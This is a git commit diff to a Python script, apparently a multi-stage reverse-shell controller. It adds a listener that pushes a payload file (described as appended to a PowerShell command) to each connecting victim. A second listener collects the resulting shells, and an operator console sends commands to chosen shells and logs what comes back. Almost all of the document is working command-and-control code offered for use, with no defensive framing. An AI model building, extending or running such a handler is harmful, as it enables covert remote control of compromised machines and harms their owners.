aae5bed0384196a55878957474a963ba5606c528
Ubuntu <ubuntu@ip-172-31-29-37.ec2.internal>
2023-11-18 20:41:01 +0000

    update

--- shell_handler.py
+++ shell_handler.py
@@ -8,8 +8,10 @@ def write_log(filename, entry):
     with open(filename, 'a') as file:
             file.write(entry)
 
-# handle incoming connections
-def handle_connections():
+# [stage1] handle incoming connections
+# payload is a string appended to a command like 'powershell <payload>'
+def handle_first_connections(ip='0.0.0.0', port='7774', payload=''):
+    global shells
     # socket
     print(f'opening listener on {ip}:{port}... ', end='')
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -20,17 +22,37 @@ def handle_connections():
     while True:
         s.listen(1)
         conn, addr = s.accept()
-        log = f'[connection received {addr}]'
+        log = f'[stage1 connection received {addr}]'
+        print(f'\n{log}')
+        write_log(f'stage1.txt', log+'\n')
+        conn.sendall((payload + '\n').encode('utf-8'))
+
+# [stage2] handle incoming connections
+def handle_connections(ip='0.0.0.0', port='7775'):
+    global shells
+    # socket
+    print(f'opening listener on {ip}:{port}... ', end='')
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind((ip, port))
+    print('done. :)')
+    # listen
+    while True:
+        s.listen(1)
+        conn, addr = s.accept()
+        log = f'[stage2 connection received {addr}]'
         print(f'\n{log}')
         write_log(f'{addr[0]}.txt', log+'\n')
         shells.append({'addr': addr[0], 'port': addr[1], 'conn': conn})
 
 # cli funcs
 def show_shells(conn): # print all items in the shells global var
+    global shells
     for i in range(len(shells)):
         conn.sendall(f'[{i}] {shells[i]["addr"]}\n'.encode('utf-8'))
 
 def send_command(conn): # send a command to a shell
+    global shells
     conn.sendall(b'shell#> ')
     shell_index = conn.recv(1024).rstrip().decode('utf-8')
     if not shell_index.isnumeric():
@@ -52,39 +74,56 @@ def send_command(conn): # send a command to a shell
     conn.sendall(resp+b'\n')
 
 def do_interactive(conn):
+    global shells
+    # prompt shell #
     conn.sendall(b'shell#> ')
     shell_index = conn.recv(1024).rstrip().decode('utf-8')
-    # input validation
+    # validate is numeric
     if not shell_index.isnumeric():
         conn.sendall(b'input must be a shell index')
         return 1
     shell_index = int(shell_index)
+    # validate is valid
     if  0 > shell_index > len(shells)-1:
         conn.sendall(b'invalid shell index')
         return -1
     shell = shells[shell_index]
+
+    # create interactive session
     while True:
+        # prompt n$
         msg = f'{shell_index}$ '.encode('utf-8')
         conn.sendall(msg)
         cmd = conn.recv(1024).rstrip().decode('utf-8')
+        # handle input
         if cmd == '.exit': return 0
         cmd = cmd+'\n'
+        # interact with target
         shell['conn'].sendall(cmd.encode('utf-8'))
         resp = shell['conn'].recv(1024)
+        conn.sendall(resp)
         write_log(f'{shell["addr"]}.txt', '> '+cmd)
         write_log(f'{shell["addr"]}.txt', resp.decode('utf-8'))
-        conn.sendall(resp)
 
 # args
 parser = argparse.ArgumentParser()
 parser.add_argument('-p', '--port', default=7774, type=int)
+parser.add_argument('-f', '--file', type=str)
 args = parser.parse_args()
 port = args.port
+payload_file = args.file
 ip = '0.0.0.0'
 
-# start listener
-t = threading.Thread(target=handle_connections, daemon=True).start()
+# start stage1 listener
+with open(payload_file) as f:
+    payload = f.read()
+t1 = threading.Thread(target=handle_first_connections, args=('0.0.0.0', 7774, payload), daemon=True).start()
 
+# start stage2 listener
+t2 = threading.Thread(target=handle_connections, args=('0.0.0.0', 7775), daemon=True).start()
+
+
+""" cli """
 def show_opts(conn):
     for opt in opts:
         cmd = opt.encode('utf-8') + b'\n'
